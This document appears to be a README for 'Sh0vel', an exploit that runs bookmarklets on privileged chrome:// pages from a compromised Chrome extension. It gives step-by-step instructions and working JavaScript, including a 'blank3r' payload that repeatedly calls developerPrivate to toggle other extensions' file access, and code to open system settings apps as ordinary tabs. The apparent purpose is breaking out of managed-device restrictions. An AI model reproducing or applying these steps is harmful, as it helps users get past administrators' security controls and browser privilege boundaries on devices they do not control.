---
title: bookmarklet-runner-sh0vel
---

-e 
Sh0vel - Run bookmarklets on almost any url

Sh0vel is an exploit letting bookmarklets run on almost any url, most notably chrome urls, allowing you to access permissions like developerPrivate or settingsPrivate from within an extension. 

Steps:
1. Get code execution in an extension. This can be by point-blank, skiovox breakout (preferably), rigtools, XSS, DNS spoofing, or some other way, but you need code execution in the extension.

2. Verify it has the correct permissions. For this to work, the following permissions are needed:
    - tabs
    - activeTab
    - browserAction
    - 'unsafe-eval' set in the CSP
If it does not have these permissions, this will not work.

3. Enable the flag "#extensions-on-chrome-urls"

4. Get a bookmarklet. This is fairly straight-forward. I'll use blank3r as an example.

5. Place the bookmarklet as follows:
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `location.href="javascript:replace this part with your own bookmarklet.";`});});
Make the extension run that code.

If you wanted to use blank3r, you would use this code:
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `let link=window.open('about:blank','_blank');link.location.href="javascript:let shim = false;var ids = prompt('extension ids (comma separated)').split(',');setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);";`});});

6. Open the url you want this code to run on. For blank3r, open chrome://extensions.

If you want to run code on an SWA (e.g. chrome://os-settings), you will need to open it as a normal tab. This can be accomplished with the code below (credits to Writable):
chrome.tabs.create({}, () => {chrome.tabs.update(null, {url: "chrome://file-manager"});});
You can replace chrome://file-manager with the SWA of your choosing.

7. Click the extension icon. If done correctly, your bookmarklet will run!

Credits:
Writable for helping open SWAs as a normal tab
Hannah for the finding the original API access exploit
The rest of Whelement: mental support
Titanium Network